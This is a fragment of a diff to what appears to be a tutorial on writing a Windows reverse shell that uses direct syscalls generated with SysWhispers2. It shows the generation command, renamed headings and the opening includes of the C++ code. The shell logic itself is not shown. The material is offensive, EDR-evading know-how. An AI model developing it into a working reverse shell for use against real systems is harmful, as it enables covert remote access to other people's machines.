@@ -28,16 +28,16 @@ python3 syswhispers.py --functions NtCreateThreadEx,NtClose --out-file syscalls
 
 This command generates two files: `syscalls.c` and `syscalls.h`.
 
-## Step 2: Writing the Reverse Shell Code
+## Step 2: Writing the Syscall Reverse Shell Code
 
-### Initial Reverse Shell Using Windows Syscalls:
+### Reverse Shell Using Windows Syscalls:
 Here is the initial version of the reverse shell using the Windows Syscalls:
 
 ```cpp
 #include <winsock2.h>
 #include <windows.h>
 #include <iostream>
-#include "/home/kali/TOOLS/VARIOS/SysWhispers2/syscalls.h"
+#include "/path/to/your/SysWhispers2/syscalls.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
